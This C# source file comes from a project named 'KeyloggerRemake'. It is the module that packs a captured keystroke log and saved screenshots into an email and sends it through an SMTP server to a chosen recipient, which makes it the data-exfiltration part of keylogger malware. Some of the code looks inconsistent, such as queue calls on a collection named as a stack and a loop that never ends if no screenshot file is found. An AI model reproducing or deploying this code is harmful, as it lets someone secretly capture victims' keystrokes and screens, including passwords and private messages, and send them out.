using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace KeyloggerRemake
{
    static class classEmail
    {
        public static MailMessage getMsg(classLog currentLog, string strReceipient, string strFromEmail)
        {
            MailMessage msgLog = new MailMessage();
            Attachment attachment;

            msgLog.From = new MailAddress(strFromEmail);
            msgLog.To.Add(strReceipient);
            msgLog.Subject = currentLog.strLogEndDateTime;
            msgLog.Body = currentLog.strLog;
            msgLog.Priority = MailPriority.High;

            while (currentLog.stkScreenshots.Count() > 0)
            {
                classScreenshot Peek = currentLog.stkScreenshots.Peek();
                string[] Screenshots = Directory.GetFiles(Peek.strScreenshotFolder, Peek.strScreenshotName + ".png");

                foreach (string strScreenshot in Screenshots)
                {
                    attachment = new Attachment(strScreenshot);
                    msgLog.Attachments.Add(attachment);
                    currentLog.stkScreenshots.Dequeue();
                }
            }

            return msgLog;
        }

        public static void sendMsg(MailMessage msgLog, string strFromEmail, string strEmailPass, string strEmailHost, int intEmailPort)
        {
            using (SmtpClient client = new SmtpClient())
            {
                client.EnableSsl = true;
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential(strFromEmail, strEmailPass);
                client.Host = strEmailHost;
                client.Port = intEmailPort;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;

                client.Send(msgLog);
            }
        }
    }
}
